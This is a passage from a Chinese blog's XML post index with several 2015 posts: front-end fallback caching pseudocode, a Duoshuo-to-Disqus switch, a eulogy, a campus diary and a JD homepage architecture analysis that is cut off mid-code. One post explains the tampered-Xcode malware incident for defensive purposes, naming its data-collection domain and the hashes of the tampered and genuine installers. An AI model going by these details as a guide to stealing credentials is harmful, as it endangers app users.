            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这两天说到的苹果软件中毒是个什么情况？</title>
      <link href="/blog/2015/09/18/what-is-wrong-with-apple/"/>
      <url>/blog/2015/09/18/what-is-wrong-with-apple/</url>
      
        <content type="html"><![CDATA[<p>今天逛微博，看到了有人发现 apple 手机中的部分软件存在盗取账户信息的问题，网上搜罗了下信息，把大概的原因和处理方案说下。本文的阐述会比较浅显易懂。</p><span id="more"></span><h3 id="如何被感染的"><a href="#如何被感染的" class="headerlink" title="如何被感染的"></a>如何被感染的</h3><p>大家对这些盗取账户信息的行为称之为手机中毒，简单的说就是使用的软件中被非软件方通过某些手段植入了程序本不该有的代码，这些代码可以获取用户的信息，甚至会伪造对话，比如下载某个音乐的时候提示要输入 app store 密码方能下载。之所以会中毒源自信任。</p><p>我们都知道，开发一个软件，需要工具，写代码的工具、编译代码的工具等等。而开发苹果手机上的软件需要苹果提供的编译和执行代码的工具，它叫做 xcode。 xcode 文件比较大，由于苹果在中国（好像）没有服务器，程序员下载 xcode 的速度就会很慢，而这个文件跟普通电影似的，可以被放到各种网盘中。所以就有人把下载好的 xcode 放到了网盘或者其他国内下载速度很快的服务器上。</p><p>问题就出在这里，这个非官方下载的 xcode 可能就被人调包了，可能是在下载之前就已经调包，也可能是在下载之时调包的。工程师使用这种被调包的 xcode 编写程序，最后编译阶段会被植入恶意程序。</p><p>打个比方，网易云音乐的开发工程师从非官网渠道下载了一个 xcode，他们开发好 iphone 的网易云音乐播放器之后，上传到 app store，那么实际上，我们下载的网易云音乐就是包含病毒的，它能够窃取你在使用网易云音乐时的操作信息，当然，可以蹦出一个提示框，让你输入 app store 密码，甚至可以做出一些更加危险，比如获取你的信用卡资金等操作。</p><h3 id="如何预防和防御"><a href="#如何预防和防御" class="headerlink" title="如何预防和防御"></a>如何预防和防御</h3><p>据了解，黑客把收集到的信息都上传到了一个网址为 init.icloud-analysis.com 的服务器上，目前这个网址已经被封了，但是不能判定黑客是否还保留了其他的渠道。</p><p>从上面的分析，我们可以知道，即便是 app store 上的软件也是不安全的，更不论有些童鞋是直接从非官方渠道下载的软件。所以：</p><ul><li>软件工程师在开发的时候一定要从官网下载 xcode，或者使用校验工具检查下 sha1 码是否准确，有问题的 xcode6.4.dmg 的 sha1 是 <code>a836d8fa0fce198e061b7b38b826178b44c053a8</code>，没有问题的是 <code>672e3dcb7727fc6db071e5a8528b70aa03900bb0 </code>。</li><li>用户应该关注下安全信息，把存在问题的软件即时删除，或者下载官方确定的靠谱版本软件</li><li>修改 app store 密码和信用卡密码</li></ul><p>最好的防御是苹果公司能够提供抵挡这个程序运行的方案，比如快速提供一个新版的苹果系统让用户即时升级。</p><h3 id="相关阅读"><a href="#相关阅读" class="headerlink" title="相关阅读"></a>相关阅读</h3><ul><li>白帽子说事儿 <a href="http://drops.wooyun.org/news/8864">http://drops.wooyun.org/news/8864</a></li><li>关注知乎 <a href="http://www.zhihu.com/question/35721299">http://www.zhihu.com/question/35721299</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 苹果中毒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大流量的下兜底容灾方案</title>
      <link href="/blog/2015/09/16/backup-solution-at-big-traffic/"/>
      <url>/blog/2015/09/16/backup-solution-at-big-traffic/</url>
      
        <content type="html"><![CDATA[<p>随着网络的普及，上网的成本和门槛越来越低，很多网站的流量也是蹭蹭蹭的往上涨，而页面上的数据来源也不确定，可能来自多个平台，也可能是有专门的人员在手动维护。由于数据来源众多，出错的概率也会增加，为了降低页面在大流量下的维护成本，本文做了一些阐述。</p><span id="more"></span><h3 id="兜底容灾的必要性"><a href="#兜底容灾的必要性" class="headerlink" title="兜底容灾的必要性"></a>兜底容灾的必要性</h3><p>一个日均承载几千万上亿流量的网页，会经常出现哪些问题呢？</p><ul><li>某个接口挂了，前端拿不到数据或者拿到的数据不够，页面展示就会出问题，出现空白或者某个模块直接天窗。</li><li>用户因为网络问题或者安装了某些插件，导致页面广告、接口请求挂掉，从而页面出现问题</li></ul><p>前者的概率不是很大，因为网页上的请求 QPS 都是预先评估过的，只要前端请求没有成倍激增，并且后端压力都在系统监控范围内，不会出太大的岔子。但是一旦出问题，页面上就有可能空白一大块，如果后端排查和处理问题不及时，很可能从小问题演变成故障。</p><p>第二个问题也是比较严峻的，据统计，不管网站做的多简洁，总是会有千分之一的用户因为网络或者浏览器插件问题导致页面访问失败或者部分接口请求失败，比如一个 pv 一亿的网站，按照千分之一计算，一个接口每天会有 10w 左右的 pv 请求失败，而请求接口一多，页面上整体的请求失败量就很高了，这个数据会达到几百万。</p><h3 id="如何兜底，如何容灾"><a href="#如何兜底，如何容灾" class="headerlink" title="如何兜底，如何容灾"></a>如何兜底，如何容灾</h3><p>兜底容灾的方案有很多，目的就是让请求失败而页面展示依然正常。下面说一说常用的几个方案：</p><p><strong>1. 再请求一次</strong></p><p>照顾到用户体验，同时也考虑到一个请求的正常发送、接受时间，我们把超时时间设置为 5s，超过 5s 或者请求的结果状态为 failed ，则重新请求一次。所以我们可以重新封装下 Ajax 模块，如：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置请求次数</span></span><br><span class="line"><span class="keyword">var</span> tryTimes = <span class="number">2</span>;</span><br><span class="line"><span class="title class_">Ajax</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: url,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">5000</span>,</span><br><span class="line">  <span class="attr">dataType</span>: <span class="string">&quot;jsonp&quot;</span>,</span><br><span class="line">  <span class="comment">// try</span></span><br><span class="line">  <span class="attr">tryTimes</span>: tryTimes</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这种处理方案对于提交订单、选中商品到购物车的页面比较合适，因为操作流是确定的，提交一次不成功，很自然的想到再提交一次，只是用户等待的不同阶段应该用不同的文案来提醒。而对于展示类的数据请求，不太适合多次失败尝试。所以首页未采用这种方案。</p><p><strong>2. 缓存每一次请求到本地</strong></p><p>现在的浏览器都支持本地储存（无论使用 userData 还是 localStorage），当每次请求到达用户浏览器的时候，把请求的数据缓存一份到本地储存，那么下次请求失败就可以使用上次的数据啦~</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Ajax</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: url,</span><br><span class="line">  <span class="attr">dataType</span>: <span class="string">&quot;jsonp&quot;</span>,</span><br><span class="line">  <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="comment">// 缓存数据到本地</span></span><br><span class="line">    <span class="title function_">cache</span>(<span class="variable constant_">DATAKEY</span>, data);</span><br><span class="line">    <span class="title function_">show</span>(data);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 请求失败，获取本地缓存数据</span></span><br><span class="line">    <span class="keyword">var</span> data = <span class="title function_">cache</span>(<span class="variable constant_">DATAKEY</span>);</span><br><span class="line">    <span class="title function_">show</span>(data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这种方式是比较常用的，每次请求成功都会缓存最新的数据。不过这里存在两个问题：</p><ul><li>如果用户第一次访问就失败了呢？要知道新用户是比较多的。</li><li>缓存的数据是否具有时效性，如果过期了呢？比如是一个推荐接口，推荐的商品用户已经购买过了，但是访问的时候接口挂掉，依然现实用户购买过的商品，这个逻辑是不太能接受的。</li></ul><p>当然，有总比没有好吧，就算是第一次访问，这个概率是相当低的，就算数据过期，但是依然是正确的链接，所以基本可以接受。</p><p><strong>3. 备用接口（硬兜底）</strong></p><p>会给自己的网页接口准备备用接口的网站，估计不会很多。我们可以做一个包装：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Ajax</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: url,</span><br><span class="line">  <span class="comment">// 备份接口</span></span><br><span class="line">  <span class="attr">backUrl</span>: backUrl</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>一旦请求失败，进入备用数据接口请求备份数据。同样的，这里也存在一个问题：如果接口是个性化的，则每个用户访问这个接口拿到的数据都不一样，那么这个备份接口该如何推数据？如果备用接口的数据跟正常接口一样，那还不如直接去请求两次。</p><p>所以这里提到的备用接口，主要是数据的硬兜底，硬兜底的来源有两个：</p><ul><li>运营维护一份数据，推送到 CDN，每一份数据都有一个固定的地址</li><li>后端向 CDN push 一份通用数据。我们知道个性化都是使用 cookie 去识别用户的，对于没有浏览器记录的新用户就没有 cookie，此时会推一份通用的数据，这个通用的数据也可以作为接口的备份源。</li></ul><h3 id="兜底容错实践"><a href="#兜底容错实践" class="headerlink" title="兜底容错实践"></a>兜底容错实践</h3><p>我们很容易得到如下的操作流程：</p><p><img src="/../blogimgs/2015/09/16/20150903_1de15c2d.jpg" alt="异步容错实践"></p><p>而这里存在的问题是：</p><ul><li>获取缓存数据后，不好对数据格式进行判断，一般来说，只有有效的数据才能存到本地储存中，而判断是否有效往往存在误差</li><li>兜底数据没有及时更新</li><li>程序只会报警，但是不会自动修复</li></ul><p>存在的隐患是：</p><ul><li>前端每次改版，如更换接口、更换人员，兜底数据没有及时更新</li><li>如果兜底数据也存在错误，则页面一定出现空白天窗</li></ul><p>所以对整个流程做了一些改进：</p><p><img src="/../blogimgs/2015/09/16/20150903_224d72cc.jpg" alt="异步容错改进"></p><p>数据经过统一平台输出，在输出之前，我们将数据推一份到 CDN 作为备份，产生另一个接口，一旦原始接口请求失败，则直接请求备份的接口，这个在规则对应和即时更新上可以做到很赞！那么基本的流程就是这样：</p><p><img src="/../blogimgs/2015/09/16/20150903_8fdbadcc.jpg" alt="异步容错改进流程"></p><p>不过为了确保无误，我的建议是，页面上每个接口必须对应一个运营手填的数据，这个作为最后的硬兜底，而这个硬兜底也会被缓存到本地，整个流程就形成一个闭环。那么，剩下的工作就只有监控和警报了。</p><p>下面是一串伪代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = interfaceURL;</span><br><span class="line"><span class="keyword">var</span> backUrl = interfaceBackURL;</span><br><span class="line"><span class="keyword">var</span> hardBackUrl = hardDataURL;</span><br><span class="line"><span class="keyword">var</span> cacheTime = 10day;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Ajax</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: url,</span><br><span class="line">  <span class="attr">backurl</span>: backUrl,</span><br><span class="line">  <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 缓存数据到本地</span></span><br><span class="line">    <span class="title function_">cache</span>(<span class="variable constant_">DATAKEY</span>, data, cacheTime);</span><br><span class="line">    <span class="title function_">show</span>(data);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 请求失败，获取本地缓存数据</span></span><br><span class="line">    <span class="keyword">var</span> data = <span class="title function_">cache</span>(<span class="variable constant_">DATAKEY</span>);</span><br><span class="line">    <span class="keyword">if</span>(data) &#123;</span><br><span class="line">      <span class="title class_">Reporter</span>.<span class="title function_">send</span>(<span class="comment">/*WARN*/</span>);</span><br><span class="line">      <span class="title function_">show</span>(data); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title class_">Reporter</span>.<span class="title function_">send</span>(<span class="comment">/*ERROR*/</span>);</span><br><span class="line">      <span class="title function_">_failed</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求硬兜底</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_failed</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: hadrBackUrl,</span><br><span class="line">    <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">      <span class="comment">// 缓存数据到本地</span></span><br><span class="line">      <span class="title function_">cache</span>(<span class="variable constant_">DATAKEY</span>, data, cacheTime);</span><br><span class="line">      <span class="title function_">show</span>(data);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="title class_">Reporter</span>.<span class="title function_">send</span>(<span class="comment">/*SUPER_ERROR*/</span>);</span><br><span class="line">      <span class="title function_">show</span>(data); </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到，我们在上面使用了缓存失效时间，考虑到数据的及时性，设置为 10 天。backUrl 是 url 的备份地址，hardBackUrl 是运营填写的备份数据，整个流程都在闭环之中，所以出问题的概率就大大降低了，即便是后端接口出错，我们也可以看着监控信息，放心的给后端开发GG打个电话，告知下等待修复，而不是急急忙忙，抓耳挠腮，担惊受怕天窗来了。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>本文提供的都是伪代码，而这些伪代码的实现并不复杂，也没必要写成组件，主要是提供思路，如何处理大流量高并发下的异步数据接口的兜底容灾。</p><p>如果你有更好的想法，可以提出来，一起交流下~</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 兜底容灾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>嘿，多说，你咋了？要不咱换成 DISQUS 吧~</title>
      <link href="/blog/2015/09/15/hei-duoshuo-what-is-wrong/"/>
      <url>/blog/2015/09/15/hei-duoshuo-what-is-wrong/</url>
      
        <content type="html"><![CDATA[<p>看到有人邮件给我，说是多说挂了，只好发邮件交流下，打开博客瞅了瞅，果然…</p><span id="more"></span><p>从最开始使用 wp 的评论，到自己写评论组件，再到托管到多说。总得感觉让别人来服务自己，轻松不少。多说是一个免费的社会化评论组件，看其 API 的形式与 disqus 差不多，估计很多地方也是参考了 disqus。</p><p>我以前是 disqus 用户，虽然国内访问有时候比较缓慢，甚至根本被墙，但体验相当不错，尤其是侧边滑出来的一个评论历史，感觉相当丝滑。看了多说网的官微，确实已经提前向用户说明了：</p><blockquote><p>[故障通知] 今天因为机房网络故障，正在排查，影响部分用户的使用。由此给大家带来的使用不便非常抱歉。</p></blockquote><p>也说：</p><blockquote><p>「服务维护通知」为了提升多说整体的服务质量，9月15日周二凌晨00:00至06:00多说将进行升级维护，届时将中断服务。给大家的使用带来的不便，非常抱歉！</p></blockquote><p>可是，却没有及时处理好问题：</p><p><img src="/../blogimgs/2015/09/15/20150902_cf630817.jpg" alt="多说官方微博评论"></p><p>引来了众人的不满。不过吧，人家一个免费工具，出点问题而且也在紧急修复，是可以理解的。抱着理解万岁的情绪，先给自己博客换上老东家 <a href="//disqus.com/">disqus</a></p><p>相比多说，DISQUS 有两个稍微让人揪心的问题：</p><ul><li>部分朋友英文水平不是很高，所以在对 disqus 做配置，或者遇到问题，查看 disqus help 的时候，觉得头偏疼</li><li>DISQUS 有时候被墙掉了，毕竟是国外的东西，估计在国内也没有 CDN，加载速度慢，甚至被墙了</li></ul><p>优点，能枚举的实在是太多了：</p><ul><li>DISQUS 在技术和文档上花费的心思比多说团队要多很多，人家论坛都做起来了，而且还有小圈子</li><li>DISQUS 的 API 更加丰富，开发者基本可以只把 DISQUS 作为评论内容的数据库，在前端来操作数据库的曾删改查。这里，屈屈给出了一个建议，不是说国内部分用户访问被墙么，我们可以将 DISQUS 的 API 封装成一个包，直接在后端服务器上跑，虽然麻烦了点，也不失为一个好办法~</li><li>体验啊，多说的体验做的实在是跟着外国货有差距！</li><li>…</li></ul><p>看到多说团队的招聘了，看来也是一直比较缺人的：</p><p><img src="/../blogimgs/2015/09/15/20150902_bfc28ffc.jpg" alt="多说团队招人"></p><p>帮忙顶一脚吧~</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多说评论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>祭忘年之交文</title>
      <link href="/blog/2015/09/11/prayer-the-bicycle-repairing-man/"/>
      <url>/blog/2015/09/11/prayer-the-bicycle-repairing-man/</url>
      
        <content type="html"><![CDATA[<p>忘年之友离世，心中只有伤悲，祭文缅怀。</p><span id="more"></span><div style='font-family:STKaiti,KaiTi,serif;background:#000;color:#FFF;padding:30px 20px;'><p>哀维：</p><p style="text-indent:2em;">乙未年，五月廿二，血压骤高，闻病就医，破脑救治，卧榻五日，不得而治，临行之际，思吾至深，含愁离世，享年五旬。顾及二子，奔波劳碌，路边一隅，修擦补车，十载有余，笑面迎人，思之伤痛，呜呼哀哉！携酒已至，阴阳相隔，只得独饮，伤痛欲绝，呜呼哀哉！呜呼老友，百喊不闻，肝肠断绝，哀号祭奠，悲痛难陈。呜呼哀哉！</p><p style="text-indent:2em;">伏维尚飨！</p><p style="text-align:right;margin-bottom:0;"><cite>-- 靖，于乙未年七月廿九</cite></p></div><p>10年九月份，初次踏进华中科技大学校门，感觉很新鲜很陌生，这个诺大的学校让我有购买一辆自行车的冲动，于是我认识了驻扎在韵苑体育馆侧墙边上的任师傅。那时候我还不知道他的姓氏，总唤他为”修车老头儿”。</p><p>…本来想写一篇长文祭奠…</p><p><img src="/../blogimgs/2015/09/11/20150911_heying.jpg" alt="合影"></p><p>一切尽在不言中。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
            <tag> 祈祷 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>做回一天学生</title>
      <link href="/blog/2015/09/11/travel-back-to-hust/"/>
      <url>/blog/2015/09/11/travel-back-to-hust/</url>
      
        <content type="html"><![CDATA[<p>去年年假还剩 6 天，再不休假就要作废了，本着一颗回归的心，很豪气的一口气请了三天假，加上周末两天，五天时间打算在踏入社会的大学校门口度过。于是，就下榻在了关山口职业技术学院门前。</p><span id="more"></span><p>进入酒店那一刻，没有在门缝中看到小卡片，感觉十分舒心，”这应该是家正规酒店”，心想。放下行李之后，直奔校园，步子迈的十分轻盈，感觉好爽。在来华科的路上，我很就严肃的思考了接下来几天的行程。然并卵，计划赶不上变化。本打算先去会一会一位忘年交（韵苑修车老头），结果被好友劝去武汉大学。</p><p>去武大的路上，因顾着跟好友扯淡，错过了一站，庆幸的是，我们还能从错过的这站抄小道过去，于是看到了立在小道跟前的旧牌坊：</p><p><img src="/../blogimgs/2015/09/10/20150905_eaec6912.jpg" alt="国立武汉大学"></p><p>没有逼格闪闪，倒还剩下些历史的沧桑感。武大门口等着久别的好友，出去吃了顿饭。朋友从德国留学回来，从她那儿顺道学了句德语：<code>/yixi&#39;libodish/</code>，然后把这句话送给了女朋友。其实我也不知道发音标不标准，只知道这是”我爱你”的意思。朋友带了些礼物，发给了在场的其他朋友，她说是香水，闻了闻，确实不错，遗憾的是我不太用这玩意儿~</p><p>吃完饭就在武大门口打了个 uber 回华科，user 司机是个武汉人，不太说普通话，嘀咕了半天才搞清楚我们在哪里。其实我听得懂武汉话，也会说两句，只是武大的校门有点多，把司机搞晕了。</p><p><img src="/../blogimgs/2015/09/10/20150905_e2968bc2.jpg" alt="武大正门夜景"></p><p>上图是武大正门，还吊着两个大灯笼，着实丑爆了，武大的校训：</p><p><img src="/../blogimgs/2015/09/10/20150905_a79d63f6.jpg" alt="武大校训"></p><p>– <span style='font-family:STKaiti,KaiTi,serif'>“自强弘毅，求是拓新”。</span></p><p>我们华科的校训，我记得很清楚：<span style='font-family:STKaiti,KaiTi,serif'>“明德厚学，求是创新”</span>，这几个字好像深深地刻在脑子里，张嘴就出来了。</p><p>返校之后，差不多已经九点半了，我下午四点才到武汉。又约了另一位同学，在校园某个角落点了杯咖啡，座谈了一个多小时。回去的路上，有看到了熟悉的一幕：</p><p><img src="/../blogimgs/2015/09/10/20150905_0c8eb923.jpg" alt="男孩子和女孩子"></p><p>重点请放到那辆车上，很明显，座板是新加上去的，很符合我们华中渴基大学男同胞做事的风格。其实，当年我也这么干过，只是后面坐了四年男生，最后车子还被偷了。现在很后悔后面加一个座板，并没有什么卵用。</p><p>以上。这仿佛就是我大四的生活写照。做回了学生，感觉真好。</p><p>还有三天半，后面要约的童鞋，你们准备好了么？菊花洗干净，等着。</p><p>对了，今天是教师节。老师们，节日快乐！打过电话、发过红包的，不谢；没打电话、没发红包的，可能是手机快没有电费了&#x3D;。 &#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 观点和感想 </category>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教师节 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>京东首页前端技术剖析与对比</title>
      <link href="/blog/2015/09/09/jd-architecture-analysis/"/>
      <url>/blog/2015/09/09/jd-architecture-analysis/</url>
      
        <content type="html"><![CDATA[<p>逛京东的时候开着 chrome 控制台，无意间看到了下面这串似曾相识的代码，</p><p><img src="/../blogimgs/2015/09/09/20150903_c32208d1.jpg" alt="京东网页部分源码"></p><p>再看了下 localstorage，</p><p><img src="/../blogimgs/2015/09/09/20150903_2d854b82.jpg" alt="京东网页 localstorage"></p><p>看到这些内容，其实京东首页的前端架构雏形就出来了。</p><span id="more"></span><p>JD 使用 seajs 作为模块加载器，使用 jd-jquery 为基本库，看到它的 jq 版本是 1.6.4，</p><p><img src="/../blogimgs/2015/09/09/201593104.jpg" alt="jd-jQuery"></p><p>对比了下”正版” <a href="http://code.jquery.com/jquery-1.6.4.min.js">jquery-1.6.4</a> 的源码，很显然，JD 使用的是自己造的轮子，这说明京东的前端生态应该是十分完善的，有轮子就会有很多组件、插件，这对一个公司批量造网页很有裨益。</p><h3 id="前后端情况"><a href="#前后端情况" class="headerlink" title="前后端情况"></a>前后端情况</h3><p>电商的主页都是以呈现为主，展示各个横向市场和纵向市场的入口，也可能会有一些个性化（所谓个性化，就是给不同的用户推荐不同的内容）的推荐。它不像交易、详情等页面，页面逻辑后端重而前端轻，后端需要做各种内容推荐、数据校验、类型判断等工作，而前端更多的是将后端的信息有序地呈现出来。</p><p>首页则不同，首页承载了大量的二级页面入口和一些频道的推荐内容，而这些数据更多的是由运营去维护，可以认为数据是死的，就算存在一些个性化的数据，也会使用 jsonp 的形式去加载，前端需要快速高效地处理这些数据，可见前端任务相当艰巨。加上作为一个网站的门面，它的安全稳定性也是极为重要的。</p><p>如果没有猜错，京东后端也有一个中间层，中间层负责组装数据，以模块为单位，根据前端的请求响应对应模块的内容，而数据是在另外一个运营平台上维护，运营填好的数据会即时的推送到 CDN 或者应用，中间层拼合数据。看不到的东西就不猜测了，我们来看看京东首页的整体结构。</p><h3 id="前端技术简要分析"><a href="#前端技术简要分析" class="headerlink" title="前端技术简要分析"></a>前端技术简要分析</h3><p>如果希望一个网站跑起来飞快，你觉得怎么做最靠谱？</p><p>我们都玩过微博，都上过手机淘宝，进入这些 app 应用，会发现很多页面几乎看不到加载的痕迹，因为他们是本地应用，很多图片、脚本、样式都已经打包在本地了，所以加载起来速度是很快的。如果希望一个网页也能飞奔起来，同样的道理，让请求的个数少一点，让请求的内容少一点。还有一个至关重要的，让那些次要的内容慢一点加载（我们称之为懒加载）。</p><h4 id="前端缓存和异步加载"><a href="#前端缓存和异步加载" class="headerlink" title="前端缓存和异步加载"></a>前端缓存和异步加载</h4><p>京东在按需加载和数据缓存上的工作做的十分到位。</p><p><img src="/../blogimgs/2015/09/09/201593105.jpg" alt="JD-page-loader"></p><p>每个具有 lazyload 异步标识的模块，都包含两个属性，一个是渲染该模块需要的内容（数据+JS），一个是这个内容过期的时间，只要内容不变就不会过期，所以这里使用的是文件 hash 来标注。</p><p><img src="/../blogimgs/2015/09/09/20150903_9f0924a6.jpg" alt="JD-data-via-localstorage"></p><p>把需要请求的路径写在 dom 上，用户滚动时，一旦该模块进入了视窗，则请求 dom 上对应的 <code>data-path</code> 地址，拿到渲染这个模块所需要的脚本和数据，不过这中间还有一层本地缓存 localstorage，如果在本地缓存中匹配到了对应的 hash string 内容，则直接渲染，否则请求到数据之后更新本地缓存。dom 上的 <code>data-time</code> 会在页面加载时候，后端计算文件 hash，hash 不变则输出内容也不变。</p><p>这里其实存在两个请求，一个请求是加载数据和脚本，而这里的内容是：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;html&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> data = &#123;<span class="title class_">JSON</span>Sting&#125;;</span></span><br><span class="line"><span class="language-javascript">seajs.<span class="title function_">use</span>(<span class="string">&#x27;path/to/$version$/script.js&#x27;</span>, <span class="keyword">function</span>(<span class="params">Script</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Script</span>.<span class="title function_">init</span>(data);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>为啥不在返回的内容中直接把脚本也输出出来？为了让数据充分缓存下了不少功夫。数据的变化频率比较高，如果数据和初始化脚本包装在一起，虽然节约了一个请求，但一旦数据变化，整个脚本都得重新加载，而将数据和脚本分离，脚本可以长期缓存在本地，单独请求数据，这个量会小很多。直接改变上面的 <code>version</code> 版本号便可以让浏览器重新请求最新脚本。</p><p>从上面可以看出，任何一个模块的改动，在前端只会引起一个较小的加载变化，加上 http 的缓存策略，服务器的压力也是很小的。</p><h4 id="工程结构"><a href="#工程结构" class="headerlink" title="工程结构"></a>工程结构</h4><p>比较常见的工程结构，如下：</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── build/</span><br><span class="line">└── src/</span><br><span class="line">    ├── widgets/</span><br><span class="line">    ├── mods/</span><br><span class="line">    |<span class="string">   ├── moduleA/        </span></span><br><span class="line"><span class="string">    </span>|<span class="string">   </span>|<span class="string">   ├── index.js  </span></span><br><span class="line"><span class="string">    </span>|<span class="string">   </span>|<span class="string">   ├── index.tpl</span></span><br><span class="line"><span class="string">    </span>|<span class="string">   </span>|<span class="string">   └── index.less</span></span><br><span class="line"><span class="string">    </span>|<span class="string">   ├── moduleB/ </span></span><br><span class="line"><span class="string">    </span>|<span class="string">   └── moduleC/  </span></span><br><span class="line"><span class="string">    ├── index.js  </span></span><br><span class="line"><span class="string">    ├── index.tpl</span></span><br><span class="line"><span class="string">    └── index.less</span></span><br></pre></td></tr></table></figure><p>所有 mods 中的 <code>tpl</code> 文件通过一些标签，引入到 <code>src/index.tpl</code> 中，需要同步渲染的模块信息直接引入，而异步渲染的模块内容，比如 <code>moduleA/index.tpl</code>，其内容就十分简单：</p><figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">&lt;div </span><br><span class="line">  lazyload </span><br><span class="line">  <span class="keyword">data</span>-<span class="built_in">path</span>=<span class="string">&quot;&lt;% moduleA %&gt;&quot;</span> </span><br><span class="line">  <span class="keyword">data</span>-<span class="built_in">time</span>=<span class="string">&quot;&lt;% md5(moduleA + getData()) %&gt;&quot;</span>&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>只引入一个模块钩子（hook），然后按需加载&#x2F;懒加载这个模块钩子内容。相比 JD 采用的也是类似的模型。</p><h3 id="横向技术对比"><a href="#横向技术对比" class="headerlink" title="横向技术对比"></a>横向技术对比</h3><p>看看上面列出的目录结构，一般情况下，为了减少网页的请求数，我们会把所有 mods 和 wedgets 中的 js 和 css 分别打包成一个文件，然后前端 combo 请求，提前加载但是懒执行，这是 CMD 的思维方式。而京东使用了更懒的方式：懒加载并且懒执行。</p><p>这种方式带来的好处就是，单个模块的更改，前端只更新一小部分缓存；而提前加载所有模块的方式，任何一个模块有改动，整体都得重新下载。脚本懒加载的缺点是，需要发起请求，如果需要加载多个模块，则需要发起多个脚本请求，可以看到，快速拖动 JD 首页，模块的加载速度不容乐观。当然，脚本是可以被浏览器缓存的，这个问题也就是首次访问或者清空了缓存才会出现。</p><p>对请求控制如此严格，怎么就没考虑下优化源码当中的<a href="view-source:http://www.jd.com/">两大段 css 和 js 代码</a>呢？是不是也可以把 css 和 js 放到 localstorage 中，减少请求数。</p><p>源码中通过函数去加载资源：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">var loadCss <span class="operator">=</span> function()&#123;</span><br><span class="line">  var style <span class="operator">=</span> loadFromLocalstorage()<span class="comment">;</span></span><br><span class="line">  inserCss(style)<span class="comment">;</span></span><br><span class="line">&#125;<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>如果 localstorage 中不存在，也不需要重新发请求，后端脚本通过 cookie 判断是否需要同步输出代码：</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 伪代码</span></span><br><span class="line"><span class="selector-tag">if</span>(<span class="built_in">cookies</span>(<span class="string">&#x27;cssV&#x27;</span>) || <span class="built_in">cookie</span>(<span class="string">&#x27;cssV&#x27;</span>) !== <span class="string">&#x27;setsV&#x27;</span>)&#123;</span><br><span class="line">  <span 